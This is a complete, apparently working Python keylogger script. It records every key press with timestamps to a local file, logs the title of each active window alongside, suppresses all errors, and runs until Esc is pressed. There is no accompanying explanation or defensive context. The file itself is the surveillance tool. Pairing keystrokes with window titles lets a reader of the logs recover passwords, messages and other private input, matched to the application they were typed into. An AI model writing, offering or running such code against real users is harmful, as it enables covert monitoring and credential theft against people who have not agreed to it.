import keyboard
import threading
import time
from datetime import datetime
import pygetwindow as gw

KEY_LOG    = "keystrokes.log"
WINDOW_LOG = "window.log"

last_title = None

def save_key(event):
    if event.event_type != keyboard.KEY_DOWN:
        return
    try:
        with open(KEY_LOG, "a", encoding="utf-8") as f :
            f.write(f"{datetime.now():%Y-%m-%d %H:%M:%S.%f} │ {event.name:15} │\n")
    except:
        pass

def window_watcher():
    global last_title
    while True:
        try:
            win = gw.getActiveWindow()
            if win and win.title and win.title != last_title:
                last_title = win.title
                clean_title = win.title.strip()[:120]  # avoid huge lines
                with open(WINDOW_LOG, "a", encoding="utf-8") as f:
                    f.write(f"{datetime.now():%Y-%m-%d %H:%M:%S} │ {clean_title}\n")
        except:
            pass
        time.sleep(0.8)   # ~1× per second
keyboard.on_press(save_key)

# Start window watcher in background
threading.Thread(target=window_watcher, daemon=True).start()
keyboard.wait('esc')